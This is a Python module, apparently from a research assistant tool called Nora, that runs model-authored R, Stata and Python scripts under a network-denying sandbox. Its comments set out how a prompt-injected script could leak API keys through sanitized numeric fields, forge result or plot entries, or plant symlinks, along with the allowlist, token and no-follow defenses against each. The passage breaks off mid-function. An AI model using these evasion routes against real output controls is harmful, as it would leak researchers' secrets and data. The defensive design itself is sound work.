"""Nora — executor for R / Stata / Python scripts.

This is the only place in Nora that actually spawns subprocesses
against the researcher's data. Its job is narrow:

1. Stage the researcher's script and the Nora runtime library in a
   scoped scratch directory under ``<cwd>/.nora/runs/<run_id>/``.
2. Invoke the right interpreter (``Rscript``, ``stata-mp``, or
   ``python3``) against the script, with ``NORA_RESULT_PATH``
   pointing at a file inside the scratch dir.
3. Wrap the invocation in ``sandbox-exec`` with a profile that denies
   network access. (Defense in depth — the runtime library is still
   the only sanctioned I/O surface inside the script.)
4. Capture stdout/stderr (the researcher's raw log), read the structured
   result from ``NORA_RESULT_PATH``, and return both.

What this executor deliberately does NOT do:
- Enforce the sanitizer's SDC rules. Output goes to the caller (which
  routes through ``sanitizer.sanitize``). The executor just runs and
  reads.
- Inspect the script's contents. The AST verifier is a P2 idea only for
  Python; for R / Stata, the runtime-library-only-I/O rule plus the
  sandbox are the structural guarantees.
- Clean up scratch dirs on success. Keeping them around is useful for
  the researcher auditing what ran. A future step-7 cleanup task can
  trim old runs.
"""

from __future__ import annotations

import os
import secrets
import shutil
import subprocess
import time
import uuid
from dataclasses import dataclass, field
from datetime import datetime, timezone
from functools import lru_cache
from importlib import resources
from pathlib import Path
from typing import Any, Callable, Literal

from nora.env_detect import Environment, detect_environment


Language = Literal["R", "Stata", "Python"]


# Hard-required Python packages — without these the runtime library
# itself won't import. Reflects what ``nora/runtime/nora.py`` needs
# at module load (NOT what the helpers need to do their job; e.g.,
# ``from_lm`` needs statsmodels but the rest of the library works
# without it). The executor refuses Python runs only when one of
# these is missing.
_PYTHON_HARD_REQUIRED: frozenset[str] = frozenset({"pandas", "numpy"})

# Per-script wall-clock cap. 300s (5 min) is the working ceiling: a
# Stata panel build plus a small batch of two-way-FE ``reghdfe``
# regressions fits comfortably (the prior 120s default forced
# researchers to artificially split scripts to stay under the wall),
# while staying tight enough that a runaway loop fails fast. For
# scripts that need more, the workflow Nora encourages is "split:
# build and save the analysis panel first, then run regressions in
# batches against the saved file" — that pattern keeps each call
# well under the cap and makes failure modes localizable.
#
# Override via ``NORA_SCRIPT_TIMEOUT_SECONDS`` for the unusual case
# where 5 min isn't enough (large simulations, bootstraps with many
# replications) or where you want a tighter cap (CI smoke tests).
# Bad values fall back to the default rather than crashing the
# bridge — a malformed env var should never strand the user — but
# emit a warning so a typo (``5min``, ``300s``) isn't silent. Cap
# at 24 hours: a value of e.g. ``2147483647`` would be accepted by
# the prior parser, letting a runaway script hang the runner for
# years; the upper bound prevents that without limiting any
# realistic research workload (a 24h script is already in
# "should be a batch job" territory, not "interactive analysis").
_TIMEOUT_FLOOR_SECONDS = 1
_TIMEOUT_CEILING_SECONDS = 24 * 60 * 60  # 24 hours


def _resolve_default_timeout() -> int:
    raw = os.environ.get("NORA_SCRIPT_TIMEOUT_SECONDS", "").strip()
    if not raw:
        return 300
    try:
        v = int(raw)
    except ValueError:
        import logging
        logging.getLogger("nora.executor").warning(
            "NORA_SCRIPT_TIMEOUT_SECONDS=%r is not an integer; "
            "falling back to default 300s", raw,
        )
        return 300
    if v < _TIMEOUT_FLOOR_SECONDS:
        import logging
        logging.getLogger("nora.executor").warning(
            "NORA_SCRIPT_TIMEOUT_SECONDS=%d is below floor %ds; "
            "falling back to default 300s", v, _TIMEOUT_FLOOR_SECONDS,
        )
        return 300
    if v > _TIMEOUT_CEILING_SECONDS:
        import logging
        logging.getLogger("nora.executor").warning(
            "NORA_SCRIPT_TIMEOUT_SECONDS=%d exceeds ceiling %ds (24h); "
            "clamping. A runaway script shouldn't hang the runner for "
            "longer than that.", v, _TIMEOUT_CEILING_SECONDS,
        )
        return _TIMEOUT_CEILING_SECONDS
    return v


DEFAULT_TIMEOUT_SECONDS = _resolve_default_timeout()

# Where per-run scratch dirs live, relative to cwd.
RUNS_SUBDIR = ".nora/runs"

# Hard caps on the JSONL result file. A model-authored script can
# loop and call ``nora_result_*`` thousands of times — each call
# emits one JSONL line. Without caps, the executor would parse,
# token-validate, sanitize, store, render, and ship every payload,
# blowing memory and conversation context regardless of the inline-
# trim that ``submit_script`` applies later. We trim at the FIRST
# point the runtime can refuse: when reading the result file.
#
#   * 8 MB on file size — enough for a few hundred wide regressions
#     (a typical regression payload is 5–20 KB after auth-token
#     framing).
#   * 256 entries — beyond this we're either looping unintentionally
#     or producing more results than a researcher will inspect in one
#     turn. The ceiling is intentionally well above legitimate
#     batch sizes (a 24-spec sweep is comfortable) but well below
#     anything that would suggest a control-flow bug or exfil loop.
#
# When a cap is hit we KEEP the early payloads (so a partial result
# still surfaces) and raise a warning so the caller knows results
# were truncated.
MAX_RESULT_FILE_BYTES = 8 * 1024 * 1024
MAX_RESULT_PAYLOADS = 256

# Name of the payload field the runtime library embeds to prove the
# payload came from the library (rather than being hand-crafted by
# Claude's script). Starts with underscore so it doesn't collide with
# a future analysis-schema field name.
RESULT_TOKEN_FIELD = "_token"

# Environment variable name the runtime library reads the token from.
# The R library reads this at source time and then unsets it; Stata
# `.ado` files read it on each invocation (Stata doesn't cleanly
# support env-unset from within the running process).
RUN_TOKEN_ENV_VAR = "NORA_RUN_TOKEN"


# Env vars we pass through to the R / Stata subprocess. Everything
# NOT in this set is stripped when we build ``subprocess_env``.
#
# Why an allowlist, not an ``os.environ`` inheritance: Claude-authored
# scripts can call ``Sys.getenv()`` (R) or read shell variables
# (Stata) and stuff the results into any allowed numeric / string
# field that reaches the sanitizer. If the parent process carries
# ``ANTHROPIC_API_KEY`` (it does — the SDK uses it to authenticate),
# AWS credentials, or any other secret, a prompt-injected script can
# exfiltrate them through e.g. a coefficient dict whose keys are
# "leak_bit_0", "leak_bit_1", … survived precisely by the
# dict_numeric sanitizer rule. The filesystem/network sandbox
# doesn't stop this — the bytes never leave the process boundary
# sandbox-exec protects.
#
# The explicit allowlist is PATH (so the interpreter can find
# system tools), HOME (R and Stata read config from here), LANG /
# LC_* (locale — determines number/date formatting), TMPDIR (R and
# Stata write scratch files here), USER / LOGNAME (some R packages
# read them), and SHELL / TERM (completeness; harmless). Everything
# else — including API keys, AWS creds, OpenAI tokens, whatever the
# researcher has in their shell — is dropped.
_SUBPROCESS_ENV_ALLOWLIST: frozenset[str] = frozenset({
    "PATH",
    "HOME",
    "LANG",
    "LC_ALL",
    "LC_CTYPE",
    "LC_COLLATE",
    "LC_MESSAGES",
    "LC_MONETARY",
    "LC_NUMERIC",
    "LC_TIME",
    "TMPDIR",
    "TEMP",
    "TMP",
    "USER",
    "LOGNAME",
    "SHELL",
    "TERM",
    # macOS Homebrew Python / R sometimes need this to locate
    # dylibs; Stata needs STATATMP. Low-risk to pass through.
    "DYLD_FALLBACK_LIBRARY_PATH",
    "STATATMP",
    # R-specific: respect the researcher's existing R library
    # paths so Nora doesn't force-reinstall packages they
    # already have.
    "R_LIBS",
    "R_LIBS_USER",
    "R_LIBS_SITE",
})


def _filter_env(parent_env: dict[str, str]) -> dict[str, str]:
    """Return only the entries of ``parent_env`` on the allowlist.

    Kept as a separate function so tests can assert that secrets
    don't leak through, and so a future audit can point at one
    place for "what Claude's scripts can see from the shell".
    """
    return {k: v for k, v in parent_env.items() if k in _SUBPROCESS_ENV_ALLOWLIST}


def _generate_run_token() -> str:
    """Return a random per-run token embedded in every valid payload.

    256 bits via `secrets.token_hex(32)`. The runtime library copies it
    into every emitted payload under `_token`; the executor validates
    and strips it before passing the payload on. A malicious script
    that bypasses the runtime library (writing hand-crafted JSON
    straight to `NORA_RESULT_PATH`) has to either guess a fresh
    256-bit token or introspect the interpreter's loaded environment
    to recover it — the former is infeasible, the latter raises
    attacker cost meaningfully without being an absolute guarantee.
    See ``docs/direction.md`` "runtime-library contract" for the full
    threat-model discussion.
    """
    return secrets.token_hex(32)


def _runtime_call_hint(language: "Language") -> str:
    """Per-language hint for "your script didn't emit a structured
    result" errors. The fallback strings used to be a binary R-vs-
    Stata branch from before Python was added; without this helper
    a Python script that exits without a ``nora.*`` call gets told
    to call ``nora_result_regress in Stata``, which is unhelpful."""
    if language == "R":
        return "nora$result(...) or nora$from_lm(...) in R"
    if language == "Stata":
        return "nora_result_regress in Stata"
    return "nora.result(...) or nora.from_lm(...) in Python"


def _validate_and_strip_token(
    payload: dict[str, Any], expected_token: str
) -> tuple[dict[str, Any] | None, str | None]:
    """Check ``payload[RESULT_TOKEN_FIELD]`` matches ``expected_token``.

    Returns ``(cleaned_payload, None)`` on success or ``(None, error)``
    on mismatch / missing. The cleaned payload has the token field
    removed so downstream consumers (sanitizer, Claude) never see it.
    """
    if not isinstance(payload, dict):
        return None, (
            f"runtime-library payload must be a JSON object, got "
            f"{type(payload).__name__}"
        )
    got = payload.get(RESULT_TOKEN_FIELD)
    if got is None:
        return None, (
            f"runtime-library payload missing {RESULT_TOKEN_FIELD!r} "
            f"authenticity field — either the script bypassed the "
            f"Nora runtime library (writing JSON directly) or is "
            f"using a library version older than this executor. The "
            f"payload is rejected."
        )
    if not isinstance(got, str) or not secrets.compare_digest(
        got, expected_token
    ):
        return None, (
            f"runtime-library payload {RESULT_TOKEN_FIELD!r} did not "
            f"match the per-run token — the payload may have been "
            f"hand-crafted to bypass the runtime library. Rejected."
        )
    cleaned = {k: v for k, v in payload.items() if k != RESULT_TOKEN_FIELD}
    return cleaned, None


def _format_bad_lines_summary(bad_lines: list[str], payload_count: int) -> str:
    """Render the malformed-lines advisory.

    Shows full detail for the first 5 entries and surfaces the line
    numbers (only) for the next chunk, so a 12-corrupt-line debug
    session reads as ``lines 6,7,8,9,10,11,12 also failed`` rather
    than an opaque ``…``.

    Both head and tail are capped: the tail keeps at most
    ``_BAD_LINES_TAIL_CAP`` line numbers and appends an ``and N more``
    suffix beyond that. A bug emitting thousands of malformed lines
    would otherwise produce a multi-KB string in ``warnings`` /
    ``error``, flooding the model context and the UI. The advisory
    is diagnostic — the researcher reads it once, opens the run dir
    if the line numbers don't tell the whole story.
    """
    head = "; ".join(bad_lines[:5])
    tail_msg = ""
    if len(bad_lines) > 5:
        extra_linenos: list[str] = []
        for entry in bad_lines[5:]:
            # Each entry starts "line N: ..."; pull N back out so
            # the tail stays compact. Defensive: if a future
            # caller adds a non-prefixed entry, the line-number
            # extraction skips it and we fall back to the count.
            if entry.startswith("line "):
                extra_linenos.append(
                    entry.split(":", 1)[0].removeprefix("line ").strip()
                )
        if extra_linenos:
            shown = extra_linenos[:_BAD_LINES_TAIL_CAP]
            overflow = len(extra_linenos) - len(shown)
            if overflow > 0:
                tail_msg = (
                    f" … and lines {','.join(shown)} also failed "
                    f"(+ {overflow} more)"
                )
            else:
                tail_msg = (
                    f" … and lines {','.join(shown)} also failed"
                )
        else:
            tail_msg = f" … and {len(bad_lines) - 5} more"
    return (
        f"{len(bad_lines)} malformed result line(s) skipped "
        f"({payload_count} valid preserved): " + head + tail_msg
    )


# Tail-cap on the bad-line summary's enumerated line numbers. 20 is
# enough to scan visually for clustering ("lines 12-31 all bad → it's
# helper #2") without letting a 1000-bad-line bug ship 1000 line
# numbers into the model's context.
_BAD_LINES_TAIL_CAP = 20


# In-process registry mapping resolved run_dir → per-run token.
# Populated when a run completes (right before the executor returns
# its ExecutionResult); consumed by the runner's ``_capture_plots``
# so it can re-validate each manifest entry's ``_token`` field
# directly, defense-in-depth over the executor's own rewrite.
#
# Why the runner re-validates: ``_filter_plot_manifest`` rewrites
# the on-disk manifest with validated content, but the manifest
# lives in the script-writable ``<run_dir>/_nora_plots/`` directory.
# A script can chmod the manifest read-only or replace it with a
# symlink whose target the host can't safely overwrite. If the
# host's rewrite fails, the original (forged) manifest stays. The
# runner's re-validation guarantees that even a leaked / unwritable
# manifest cannot smuggle a row-level plot past the kind gate.
#
# The token IS NOT plumbed through ToolCallResult.text (the JSON
# the model sees) — exposing it there would let the model emit
# forged entries with the real token. The in-process dict is the
# private channel.
#
# Cleanup: the runner removes its entry after consumption. A turn
# that never reaches ``_capture_plots`` (early failure) leaves an
# entry behind; the registry would grow without bound on long-
# lived sessions. The cap below bounds the worst case by evicting
# the oldest entries when full.
_RUN_TOKEN_REGISTRY: dict[str, str] = {}
_RUN_TOKEN_REGISTRY_CAP = 256


def register_run_token(run_dir: Path, token: str) -> None:
    """Record ``token`` as the authenticity token for ``run_dir``.

    Resolves the run_dir before keying so a runner using a
    non-canonical path (relative, symlinked) still finds the entry.
    Evicts the oldest entries past ``_RUN_TOKEN_REGISTRY_CAP``.
    """
    try:
        key = str(run_dir.resolve())
    except OSError:
        key = str(run_dir)
    _RUN_TOKEN_REGISTRY[key] = token
    while len(_RUN_TOKEN_REGISTRY) > _RUN_TOKEN_REGISTRY_CAP:
        # Pop oldest insertion-order entry (Python dicts preserve order).
        _RUN_TOKEN_REGISTRY.pop(next(iter(_RUN_TOKEN_REGISTRY)), None)


def get_run_token(run_dir: Path) -> str | None:
    """Return the token registered for ``run_dir``, or ``None`` if
    no entry exists.

    Non-destructive: both the runner's ``_capture_plots`` and the
    tool layer's ``_summarize_plot_helpers`` need to validate
    entries in the same run. A single consume would race the two
    callers. Cleanup is handled by the registry's LRU eviction cap
    so stale entries don't accumulate.

    Missing entry → caller treats every manifest entry as
    untrusted (fail closed). A re-attached session or replay path
    that lacks the in-process registration drops all helper plots
    rather than silently trusting their kind labels.
    """
    try:
        key = str(run_dir.resolve())
    except OSError:
        key = str(run_dir)
    return _RUN_TOKEN_REGISTRY.get(key)


# Note: an earlier iteration of this module raised a
# ``PlotManifestUnsanitizable`` exception with a write→unlink→
# rename-file→rename-dir cascade when the no-follow rewrite failed.
# That layer is unnecessary under the current design: downstream
# consumers (``SessionRunner._capture_plots`` and
# ``_summarize_plot_helpers``) re-validate each entry's ``_token``
# against the per-run registry, so a forged entry that survives the
# failed rewrite still gets dropped at consumer time. The cascade
# also conflicted with the test contract that the original manifest
# stays on disk when the rewrite is blocked. The downstream
# re-validation is the load-bearing protection.


def _filter_plot_manifest(run_dir: Path, run_token: str) -> int:
    """Drop manifest entries whose ``_token`` is missing or wrong, and
    strip the field from the rest. Returns the number of entries
    dropped.

    The plot manifest at ``<run_dir>/_nora_plots/manifest.jsonl`` is
    the disclosure-control allowlist for vision attachment: anything
    listed there with a ``kind`` in ``_PLOT_KIND_ALLOWLIST`` rides
    the next turn as an image. The manifest file itself sits inside
    the per-run directory, which the analysis script can write, so
    nothing structural prevents a script from saving a raw-data plot
    under ``_nora_plots/`` and appending a hand-crafted manifest line
    that labels it ``coefficients``. That would slip a row-level
    plot past the JSON sanitizer through the vision side channel.
    Same posture as ``_parse_result_jsonl``: helpers stamp every
    entry with the per-run token, the executor validates and strips
    it before any consumer sees the file. A determined script can
    still introspect the runtime library's loaded module state to
    recover the token, but doing so requires explicit code in the
    script the researcher reviews, same trust model as the result-
    payload validation.

    Fail-soft rewrite: the rewrite can fail (script-planted
    symlink refused by no-follow, chmod-blocked file, disk full).
    When it does, the original on-disk manifest stays in place
    and downstream consumers (``SessionRunner._capture_plots`` /
    ``_summarize_plot_helpers``) re-validate each entry's
    ``_token`` against the per-run registry. A forged entry can't
    smuggle through the failed rewrite because the re-validation
    catches it at consumer time.
    """
    import json

    manifest_path = run_dir / "_nora_plots" / "manifest.jsonl"
    if not manifest_path.is_file():
        return 0
    try:
        text = manifest_path.read_text(encoding="utf-8")
    except OSError:
        return 0
    kept: list[dict[str, Any]] = []
    dropped = 0
    for raw_line in text.splitlines():
        line = raw_line.strip()
        if not line:
            continue
        try:
            entry = json.loads(line)
        except json.JSONDecodeError:
            dropped += 1
            continue
        if not isinstance(entry, dict):
            dropped += 1
            continue
        got = entry.get(RESULT_TOKEN_FIELD)
        if not isinstance(got, str) or not secrets.compare_digest(
            got, run_token
        ):
            dropped += 1
            continue
        # Keep ``_token`` in the validated entries. Downstream
        # readers (runner's ``_capture_plots`` and the tool layer's
        # ``_summarize_plot_helpers``) re-validate the token
        # themselves — defense in depth against this rewrite being
        # blocked by a script that chmods the manifest read-only.
        # The token is per-run and never reaches the model: the
        # runner strips it from staged plot metadata, and the
        # summary skips the field. Keeping it on disk lets every
        # consumer make the same authenticity decision, instead of
        # implicitly trusting the rewrite to have happened.
        kept.append(entry)
    # No-follow rewrite: the manifest lives in script-writable
    # territory. A script can symlink ``manifest.jsonl`` →
    # arbitrary user-writable path so the host's write follows
    # and overwrites the symlink target. The helper refuses to
    # follow. If the rewrite fails for any reason (symlink
    # planted, chmod-blocked, disk full), the original file
    # stays in place — downstream readers (runner's
    # ``_capture_plots`` and tools' ``_summarize_plot_helpers``)
    # re-validate the ``_token`` field per entry via the run-token
    # registry, so a forged entry can't smuggle through the failed
    # rewrite. The rewrite is just an optimization to keep the
    # on-disk manifest small; the load-bearing security gate is
    # consumer-side token re-validation.
    #
    # Fail-soft rewrite. If the no-follow write fails (symlink
    # planted, chmod-blocked, disk full), the original file
    # stays on disk; consumers re-validate per-entry against the
    # run-token registry, so a forged entry can't smuggle through.
    _write_text_no_follow(
        manifest_path,
        "".join(json.dumps(e, ensure_ascii=False) + "\n" for e in kept),
    )
    return dropped


# Filename of the per-run manifest recording top-level cwd files this
# run created or modified. The Files panel reads these manifests
# across all runs and excludes the listed files from the researcher's
# view — they're already represented in the script's result card, so
# duplicating them in the panel just adds noise.
CWD_WRITES_MANIFEST_NAME = "cwd_writes.json"


def _write_text_no_follow(path: Path, text: str) -> bool:
    """Write ``text`` to ``path`` without following symlinks.

    The post-run host writes (cwd_writes.json, stdout.log, stderr.log,
    the plot manifest rewrite) all land in script-writable directories.
    A script can plant a symlink at the target path BEFORE exiting,
    pointing at any host-writable file (``~/.ssh/known_hosts``,
    ``~/.config/...``, etc.). A plain ``Path.write_text`` follows
    that symlink and overwrites the target with content the script
    can largely control. The macOS sandbox's
    ``(allow file-write* (subpath run_dir))`` does NOT block symlink
    creation in the run_dir (verified empirically against the actual
    profile shape Nora uses).

    Defense: ``os.open`` with ``O_NOFOLLOW``. If the path already
    exists as a symlink, the open fails with ``ELOOP`` and we
    refuse to write — the host doesn't follow the link, and the
    legitimate file (if any) was never the symlink to begin with.
    The legitimate happy path (path doesn't exist OR is a regular
    file) writes the content as before.

    We also fstat the opened fd and refuse non-regular files
    (a FIFO planted by the script could let it siphon the host's
    write into a process it controls).

    Returns ``True`` on success, ``False`` when the open / write
    failed for ANY reason. Callers treat False as fail-open for
    the data they were writing (the manifest just stays empty /
    the log stays missing), which is the same posture the prior
    ``except OSError: pass`` blocks already had.
    """
    import stat as _stat

    flags = os.O_WRONLY | os.O_CREAT | os.O_TRUNC
    # O_NOFOLLOW is present on macOS / Linux / BSD. On platforms
    # without it the open follows symlinks; we accept that as the
    # cost of cross-platform compat (Nora targets macOS today; the
    # symlink-creation primitive is also platform-gated).
    flags |= getattr(os, "O_NOFOLLOW", 0)
    try:
        fd = os.open(path, flags, 0o600)
    except OSError:
        return False
    try:
        try:
            st = os.fstat(fd)
        except OSError:
            return False
        if not _stat.S_ISREG(st.st_mode):
            return False
        try:
            with os.fdopen(fd, "w", encoding="utf-8") as f:
                fd = -1
                f.write(text)
        except OSError:
            return False
    finally:
        if fd >= 0:
            try:
                os.close(fd)
            except OSError:
                pass
    return True


def _snapshot_cwd_top_level(cwd: Path) -> dict[str, tuple[float, int]]:
    """Snapshot top-level cwd files as a dict of name → (mtime, size).

    Excludes the ``.nora/`` subtree (run dirs, the store, the session
    config), other dotfiles (``.DS_Store``), symlinks, and non-files.
    Failure returns an empty dict — the diff downstream just won't
    tag anything as script-written, which fails open (more files
    visible in the panel, not fewer).
    """
    snapshot: dict[str, tuple[float, int]] = {}
    try:
        for child in cwd.iterdir():
            if child.name.startswith("."):
                continue
            if child.is_symlink() or not child.is_file():
                continue
            try:
                stat = child.stat()
            except OSError:
                continue
            snapshot[child.name] = (stat.st_mtime, stat.st_size)
    except OSError:
        return {}
    return snapshot


def _write_cwd_writes_manifest(
    cwd: Path,
    run_dir: Path,
    pre_snapshot: dict[str, tuple[float, int]],
) -> None:
    """Diff cwd top-level against ``pre_snapshot`` and write a JSON
    manifest of files this run created or modified.

    Manifest format: a list of ``{"name", "mtime", "size", "created"}``
    rows. ``created`` distinguishes the two cases:

      * ``created: true`` — the file was absent before the run.
        Its bytes are entirely the script's output. The Files panel
        filter hides these because they already appear on the
        script's result card (duplicating them in the panel is
        noise, and reading them through bridge endpoints is the
        same SDC-bypass concern as run-dir scripts).

      * ``created: false`` — the file existed before the run and
        the run changed it (mtime or size differs). These are
        audit-relevant: a script that overwrote a researcher's
        source dataset or hand-authored script needs to stay
        visible so the change is noticeable. Hiding modified
        files masks accidental overwrites, which is exactly the
        case where visibility matters most.

    The Files-panel filter (``script_written_cwd_files`` in
    ``session_files.py``) reads this distinction and hides only
    ``created`` rows; ``modified`` rows stay in the panel. Both
    kinds still de-tag automatically when the on-disk file's
    (mtime, size) no longer matches the manifest — so a
    researcher who edits a script-created file makes it visible
    in the panel again.

    Backwards compatibility: ``created`` defaults to ``True`` in
    the reader for old-format rows that lack the field, preserving
    the pre-fix "hide everything tagged" behaviour for sessions
    whose manifests predate this change.

    Best-effort: any I/O failure here is silent. The fallback is
    "this run's writes don't get tagged", which means the panel
    shows them — acceptable as a graceful degradation.
    """
    import json

    try:
        post = _snapshot_cwd_top_level(cwd)
    except Exception:  # noqa: BLE001 — snapshot is best-effort
        return
    rows: list[dict[str, Any]] = []
    for name, (mtime, size) in post.items():
        prev = pre_snapshot.get(name)
        if prev is None:
            rows.append({
                "name": name,
                "mtime": mtime,
                "size": size,
                "created": True,
            })
        elif prev != (mtime, size):
            rows.append({
                "name": name,
                "mtime": mtime,
                "size": size,
                "created": False,
            })
    if not rows:
        return
    manifest_path = run_dir / CWD_WRITES_MANIFEST_NAME
    # No-follow write: the manifest path lives inside run_dir,
    # which is script-writable. A script can plant a symlink at
    # the manifest path before exiting so the host's write
    # follows it and overwrites an arbitrary user file. The
    # helper refuses to follow.
    _write_text_no_follow(
        manifest_path, json.dumps(rows, ensure_ascii=False),
    )


def _parse_result_jsonl(
    text: str, run_token: str
) -> tuple[list[dict[str, Any]], list[str], bool]:
    """Parse a JSONL result file line by line, skipping bad lines.

    A single corrupt line (e.g. a degenerate Stata fit that emitted a
    missing-value marker in ``f_statistic``, or a payload that fails
    authenticity-token validation) used to shadow every later valid
    line in the same batch — the parser would ``break`` and lose the
    rest. The current contract is "skip the bad line, keep going", so
    1 of 8 corrupt lines becomes "7 results + 1 documented error", not
    "0 results + 1 documented error".

    Stops appending payloads once ``MAX_RESULT_PAYLOADS`` is reached
    so a runaway loop in the script can't blow memory / context. The
    file-byte cap is enforced one level up in ``run_script`` before
    calling here.

    Returns ``(payloads, bad_line_messages, truncated)``. ``payloads``
    carries every line that parsed AND token-validated, in emission
    order; ``bad_line_messages`` carries one short string per failed
    line for the caller to surface back to the model; ``truncated``
    is ``True`` iff the entry-count cap kicked in.
    """
    import json

    payloads: list[dict[str, Any]] = []
    bad_lines: list[str] = []
    truncated = False
    for lineno, raw_line in enumerate(text.splitlines(), start=1):
        line = raw_line.strip()
        if not line:
            continue
        if len(payloads) >= MAX_RESULT_PAYLOADS:
            truncated = True
            break
        try:
            raw_payload = json.loads(line)
        except json.JSONDecodeError as je:
            bad_lines.append(f"line {lineno}: {je.msg} at col {je.colno}")
            continue
        cleaned, auth_err = _validate_and_strip_token(raw_payload, run_token)
        if auth_err is not None:
            bad_lines.append(f"line {lineno}: {auth_err}")
            continue
        payloads.append(cleaned)
    return payloads, bad_lines, truncated


@lru_cache(maxsize=1)
def _cached_environment() -> Environment:
    """Return a process-local cached runtime probe.

    ``detect_environment()`` spawns multiple subprocesses (R package
    probe, Python package probe, prefix detection), which is fine at
    app startup but expensive to repeat on every ``submit_script``.
    Caching here keeps back-to-back regressions from paying that fixed
    tax every time.

    Callers with an already-known environment can still pass ``env=``
    to ``run_script`` and bypass this cache entirely.
    """
    return detect_environment()


def clear_environment_cache() -> None:
    """Drop the cached environment probe.

    Test hook today; also useful for a future explicit "refresh local
    runtimes" UI action if Nora grows one.
    """
    _cached_environment.cache_clear()


# ---------------------------------------------------------------------------
# Public API
# ---------------------------------------------------------------------------

@dataclass
class ExecutionResult:
    """Outcome of running one script.

    - ``ok`` is ``True`` iff the subprocess exited 0 AND at least one
      valid JSON payload was written to the result file. Fatal
      deviations (timeout, non-zero exit, missing result file, empty
      result file, every line malformed) flip ``ok=False`` and fill
      ``error``.
    - ``warnings`` carries non-fatal advisories about the run — most
      commonly malformed JSONL lines that were skipped while OTHER
      lines parsed and validated cleanly. A run with 7 valid payloads
      and 1 malformed line stays ``ok=True`` and the malformed-line
      summary lands here, not in ``error``: the legitimate output
      should reach the caller without being demoted to
      "execution_failed". When NO payloads survive, the malformed-line
      message is upgraded into ``error`` instead, since it is then the
      only signal the caller has.
    - ``raw_stdout`` / ``raw_stderr`` are what the researcher sees in the
      TUI. Never routed to the sanitizer.
    - ``result_payloads`` is the list of parsed JSON payloads from the
      result file, in emission order, intended for ``sanitize()``. Still
      raw, no SDC rules applied here. The result file is JSONL: one
      object per line. A single-helper script produces one entry; a
      script that calls multiple ``nora_result_*`` helpers produces one
      entry per call. Empty list means no payload was emitted, which
      is treated as a script error in the success path.
    - ``run_dir`` and ``script_path`` are kept around for audit.
    - ``duration_seconds`` is wall-clock time inside the subprocess.
    """
    ok: bool
    language: Language
    raw_stdout: str
    raw_stderr: str
    exit_code: int | None
    result_payloads: list[dict]
    error: str | None
    run_dir: Path
    script_path: Path | None
    duration_seconds: float
    warnings: list[str] = field(default_factory=list)


def run_script(
    language: Language,
    code: str,
    cwd: Path,
    *,
    env: Environment | None = None,
    timeout_seconds: int = DEFAULT_TIMEOUT_SECONDS,
    proc_register: "Callable[[subprocess.Popen[str]], None] | None" = None,
) -> ExecutionResult:
    """Stage + run + capture the researcher's script.

    Never raises for normal failure modes (interpreter missing, timeout,
    non-zero exit, bad result file). Those show up as ``ok=False`` with
    ``error`` populated so the calling tool can return a policy-shaped
    response to Claude. Programmer errors (invalid ``language``, etc.)
    still raise ``ValueError``.
    """
    env = env or _cached_environment()
    if language not in ("R", "Stata", "Python"):
        raise ValueError(
            f"unsupported language {language!r}; must be R, Stata, or Python"
        )

    # 1. Scratch dir.
    run_dir = _make_run_dir(cwd)
    result_path = run_dir / "result.json"
    script_path: Path | None = None

    # Preflight: sandbox required. On macOS `/usr/bin/sandbox-exec`
    # should always be present; if it isn't (or we're not on macOS at
    # all), we refuse to run rather than falling through to an
    # unsandboxed subprocess. The sandbox profile is the enforcement
    # of the data-boundary story — without it, a malicious script has
    # unrestricted local file access and could smuggle file contents
    # out through result fields the sanitizer forwards.
    if env.sandbox_exec is None:
        return ExecutionResult(
            ok=False, language=language, raw_stdout="", raw_stderr="",
            exit_code=None, result_payloads=[],
            error=(
                "sandbox-exec not available on this system — Nora "
                "refuses to run scripts unsandboxed. On macOS this "
                "binary lives at /usr/bin/sandbox-exec and is always "
                "present; if you're on Linux or Windows, submit_script "
                "is not supported in this Nora version."
            ),
            run_dir=run_dir, script_path=None, duration_seconds=0.0,
        )

    # Preflight: interpreter present.
    if language == "R" and env.r is None:
        return ExecutionResult(
            ok=False, language=language, raw_stdout="", raw_stderr="",
            exit_code=None, result_payloads=[],
            error=(
                "Rscript not found on this machine. Install R from "
                "https://cran.r-project.org and re-launch Nora, or "
                "submit the script in Stata instead."
            ),
            run_dir=run_dir, script_path=None, duration_seconds=0.0,
        )
    if language == "Stata" and env.stata is None:
        return ExecutionResult(
            ok=False, language=language, raw_stdout="", raw_stderr="",
            exit_code=None, result_payloads=[],
            error=(
                "Stata not found on this machine. Install Stata or submit "
                "the script in R or Python instead."
            ),
            run_dir=run_dir, script_path=None, duration_seconds=0.0,
        )
    if language == "Python":
        if env.python is None:
            return ExecutionResult(
                ok=False, language=language, raw_stdout="", raw_stderr="",
                exit_code=None, result_payloads=[],
                error=(
                    "python3 not found on PATH. Install Python 3 (the "
                    "official installer from python.org or via Homebrew, "
                    "``brew install python``) and re-launch Nora, or "
                    "submit the script in R or Stata instead."
                ),
                run_dir=run_dir, script_path=None, duration_seconds=0.0,
            )
        # Hard-required packages: the runtime library imports them
        # (or its emit-time encoder does). Soft-recommended ones
        # (statsmodels, scipy) are only needed by specific helpers
        # — refuse only on the hard set so a researcher who only
        # uses descriptive helpers doesn't have to install OLS deps.
        hard_missing = sorted(set(env.python.missing_packages) & _PYTHON_HARD_REQUIRED)
        if hard_missing:
            return ExecutionResult(
                ok=False, language=language, raw_stdout="", raw_stderr="",
                exit_code=None, result_payloads=[],
                error=(
                    "Python is installed at "
                    f"{env.python.binary} but the Nora runtime needs "
                    f"these packages: {', '.join(hard_missing)}. "
                    f"Install them with "
                    f"``{env.python.binary} -m pip install {' '.join(hard_missing)}`` "
                    f"and re-launch Nora."
                ),
                run_dir=run_dir, script_path=None, duration_seconds=0.0,
            )

    # 2. Stage runtime + script.
    lib_dir = _stage_runtime(run_dir, language)
    script_path = _write_script(run_dir, language, code)

    # 3. Compose the command + sandbox profile.
    extra_read_paths: tuple[str, ...] = ()
    if language == "R":
        cmd = _r_command(env.r.binary, lib_dir, script_path)  # type: ignore[union-attr]
    elif language == "Stata":
        cmd = _stata_command(env.stata.binary, lib_dir, script_path)  # type: ignore[union-attr]
    else:  # Python
        cmd = _python_command(env.python.binary, script_path)  # type: ignore[union-attr]
        # Allow the interpreter to read its own stdlib + site-packages
        # — critical for venv / pyenv / conda Pythons that live
        # outside the system trees the default sandbox already covers.
        # Plus the Nora-managed package dir, where ``install_packages``
        # writes pip ``--target`` payloads — without this read grant,
        # script imports of Nora-installed packages would deny at the
        # sandbox layer even though the import path entry resolves.
        from nora.package_installer import nora_python_pkg_dir
        pkg_dir = nora_python_pkg_dir(env.python.binary)  # type: ignore[union-attr]
        extra_read_paths = (
